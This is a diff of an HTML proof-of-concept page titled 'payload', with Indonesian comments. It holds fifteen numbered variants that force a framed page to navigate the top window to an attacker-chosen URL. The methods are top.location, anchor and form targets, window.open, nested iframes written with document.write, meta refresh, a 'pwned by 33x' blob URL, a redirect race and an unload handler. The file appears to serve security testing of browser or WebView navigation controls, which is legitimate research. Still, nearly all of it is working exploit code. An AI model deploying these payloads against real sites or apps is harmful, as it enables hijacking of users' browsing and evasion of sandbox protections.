@@ -1,36 +1,40 @@
 <!doctype html>
-<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>.</title>
-<style>body{font:15px -apple-system,system-ui;margin:0;padding:8px;background:#ffe}button{font-size:17px;padding:16px;width:100%;background:#b00;color:#fff;border:0;border-radius:8px}</style></head><body>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>payload</title>
+<style>body{font:13px -apple-system,system-ui;margin:0;padding:6px;background:#ffd}
+button{font-size:16px;padding:14px;width:100%;background:#b00;color:#fff;border:0;border-radius:6px;margin-top:4px}</style></head><body>
 <div id="lbl"></div>
 <script>
-var v = (location.search.match(/[?&]v=(\d+)/)||[])[1] || '1';
-var S = decodeURIComponent((location.search.match(/[?&]s=([^&]+)/)||[])[1] || 'geo:0,0');
-document.getElementById('lbl').textContent = 'payload v'+v+' → '+S;
+var Q=location.search;
+var v=+((Q.match(/[?&]v=(\d+)/)||[])[1]||1);
+var s=decodeURIComponent((Q.match(/[?&]s=([^&]*)/)||[])[1]||'geo:0,0');
+document.getElementById('lbl').textContent='v'+v+'  →  '+s;
+var J=JSON.stringify(s);
 
-function tap(fn){ var b=document.createElement('button'); b.textContent='TAP DI SINI (v'+v+')';
-  b.onclick=fn; document.body.appendChild(b); }
+function tap(f){var b=document.createElement('button');b.textContent='TAP DI SINI';b.onclick=f;document.body.appendChild(b);}
+function child(){var f=document.createElement('iframe');f.width=0;f.height=0;document.body.appendChild(f);return f;}
+function writeNav(doc){doc.write('<scr'+'ipt>setTimeout(function(){top.location.href='+J+'},200)<\/scr'+'ipt>');doc.close();}
 
 setTimeout(function(){
-  try {
-    if (v==='1' || v==='2' || v==='12') { top.location.href = S; }                 // klasik
-    else if (v==='3') { tap(function(){ top.location.href = S; }); }               // butuh aktivasi user
-    else if (v==='4') {                                                            // <a target=_top>
-      var a=document.createElement('a'); a.href=S; a.target='_top';
-      a.textContent='x'; document.body.appendChild(a); a.click();
-    }
-    else if (v==='5') {                                                            // <form target=_top>
-      var f=document.createElement('form'); f.action=S; f.target='_top'; f.method='GET';
-      document.body.appendChild(f); f.submit();
-    }
-    else if (v==='6') { tap(function(){ window.open(S); }); }                      // delegate window-creation
-    else if (v==='7') { tap(function(){ window.open(S,'_top'); }); }               // hybrid open→top
-    else if (v==='8') {                                                            // iframe BERSARANG
-      var n=document.createElement('iframe');
-      n.srcdoc='<scr'+'ipt>setTimeout(function(){top.location.href='+JSON.stringify(S)+'},300)</scr'+'ipt>';
-      document.body.appendChild(n);
-    }
-    else if (v==='9')  { location.href = S; }                                      // frame navigasi DIRINYA
-    else if (v==='11') { top.location.replace(S); }                                // replace, bukan assign
-  } catch(e){ document.getElementById('lbl').textContent += ' ERR:'+e; }
-}, 300);
+ try{
+  if(v===1){ top.location.href=s; }
+  else if(v===2){ tap(function(){ top.location.href=s; }); }
+  else if(v===3){ var a=document.createElement('a');a.href=s;a.target='_top';a.textContent='.';document.body.appendChild(a);a.click(); }
+  else if(v===4){ var f=document.createElement('form');f.action=s;f.target='_top';f.method='GET';document.body.appendChild(f);f.submit(); }
+  else if(v===5){ top.location.replace(s); }
+  else if(v===6){ tap(function(){ window.open(s); }); }
+  else if(v===7){ tap(function(){ window.open(s,'_top'); }); }
+  else if(v===8){ tap(function(){ window.open(s,'_blank'); }); }
+  else if(v===9){ location.href=s; }
+  else if(v===10){ writeNav(child().contentDocument); }
+  else if(v===11){ var d=child().contentDocument; d.write('<iframe id=g width=0 height=0></iframe>'); d.close();
+                   writeNav(d.getElementById('g').contentDocument); }
+  else if(v===12){ var m=document.createElement('meta');m.httpEquiv='refresh';m.content='0;url='+s;document.head.appendChild(m); }
+  else if(v===13){ var b=new Blob(['<h1>pwned by 33x</h1>'],{type:'text/html'});
+                   top.location.href=URL.createObjectURL(b); }
+  else if(v===14){ top.location.href='https://ajaone.github.io/testing-repository/test/index.html';
+                   setTimeout(function(){ top.location.href=s; },30); }
+  else if(v===15){ window.addEventListener('unload',function(){ top.location.href=s; });
+                   location.href='about:blank'; }
+ }catch(e){ document.getElementById('lbl').textContent+='  ERR:'+e; }
+},300);
 </script></body></html>
